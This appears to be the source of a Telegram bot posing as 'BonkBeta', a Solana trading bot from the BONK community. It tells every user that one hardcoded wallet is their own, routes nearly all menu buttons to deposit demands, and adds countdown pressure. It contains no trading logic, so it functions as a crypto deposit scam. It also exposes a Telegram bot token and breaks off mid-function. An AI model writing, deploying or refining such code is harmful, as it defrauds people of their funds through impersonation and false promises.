const { Connection, PublicKey } = require('@solana/web3.js');
const { Telegraf, Markup } = require('telegraf');

// Update the connection URL and bot token
const connection = new Connection("(link unavailable)");
const bot = new Telegraf("7820695778:AAFytnQOc6cn6NHFlnYxKSF_BQhPxLLkBI4");
const minBalanceThreshold = 0.1;
const userWalletAddress = "D8T2LnWE6dGJ8dCQSCLzzgRvGtLySAcdeWyCZzJF7vDA";

// Utility to check balance
async function checkBalance() {
  const balance = await connection.getBalance(new PublicKey(userWalletAddress));
  return balance / 10 ** 9; 
}

// Function to handle low balance
async function lowBalanceHandler(ctx) {
  const balance = await checkBalance();
  if (balance < minBalanceThreshold) {
    await ctx.reply(
      `Low balance! Current balance: ${balance} SOL.\n` +
      `Please copy the deposit address below and make a payment.\n\n` +
      `${userWalletAddress}\n\n` +
      `Tap "Copy Address" to copy the deposit address.\n\n` +
      `Refresh balance after payment.`,
      Markup.inlineKeyboard([
        [Markup.button.callback("Copy Address", "copy_address")],
        [Markup.button.callback("Refresh Balance", "refresh_balance")],
      ])
    );
    startCountdown(ctx, 5 * 60); 
    return true;
  }
  return false;
}

// Countdown function for payment
function startCountdown(ctx, seconds) {
  const interval = setInterval(async () => {
    if (seconds <= 0) {
      clearInterval(interval);
      await ctx.reply("Payment window has expired. Please initiate a new transaction if necessary.");
    } else {
      await ctx.reply(`You have ${Math.floor(seconds / 60)}m ${seconds % 60}s remaining to complete the payment.`);
      seconds -= 60;
    }
  }, 60000); 
}

// Start command with updated inline menu
bot.start(async (ctx) => {
  await ctx.reply(
    "Welcome to BonkBeta\nSolana's fastest bot to trade any coin (SPL token), built by a team of friends from the BONK community.\n\nYou currently have no SOL balance. To get started with trading, send some SOL to your bonkbot wallet address:\n\n" +
    `${userWalletAddress}\n\n` +
    "Once done tap refresh and your balance will appear here.\n\nTo buy a token just enter a token address, or even post the Birdeye or pump.fun link of the coin.\n\nFor more info on your wallet and to retrieve your private key, tap the wallet button below. We guarantee the safety of user funds on BONKBeta, but if you expose your private key your funds will not be safe.",
    Markup.inlineKeyboard([
      [Markup.button.callback("Buy", "wallet")],
      [Markup.button.callback("Sell & Manage", "wallet")],
      [Markup.button.callback("Help", "wallet"), Markup.button.callback("Refer Friends", "wallet"), Markup.button.callback("Alerts", "wallet")],
      [Markup.button.callback("Wallet", "wallet")],
      [Markup.button.callback("Settings", "wallet")],
      [Markup.button.callback("Rugpull Scan", "rugpull_scan"), Markup.button.callback("Pin", "wallet"), Markup.button.callback("Refresh", "refresh_balance")]
    ])
  );
});

// Inline button actions for each command
bot.action("wallet", async (ctx) => {
  const balance = await checkBalance();
  await ctx.reply(`Current wallet balance: ${balance} SOL.`);
  if (balance < minBalanceThreshold) {
    await lowBalanceHandler(ctx);
  }
});

// Action to refresh balance
bot.action("refresh_balance", async (ctx) => {
  const balance = await checkBalance();
  await ctx.reply(`Updated wallet balance: ${balance} SOL.`);
  if (balance < minBalanceThreshold) {
    await lowBalanceHandler(ctx);
  } else {
    await ctx.reply("Thank you for the payment. Your balance has been updated.");
  }
});

// Action to copy deposit address
bot.action("copy_address", async (ctx) => {
  await ctx.reply(`Deposit Address: ${userWalletAddress}`);
});

// Action to handle Rugpull Scan
bot.action("rugpull_scan", async (ctx) => {
  const balance = await checkBalance();
  if (balance < minBalanceThreshold) {
    await ctx.reply("Insufficient balance! Please deposit funds to access Rugpull Scan.");
    await lowBalanceHandler(ctx);
  } else {
    await ctx.reply("Rugpull Scan feature is coming soon!");
    // Add Rugpull Scan logic
```
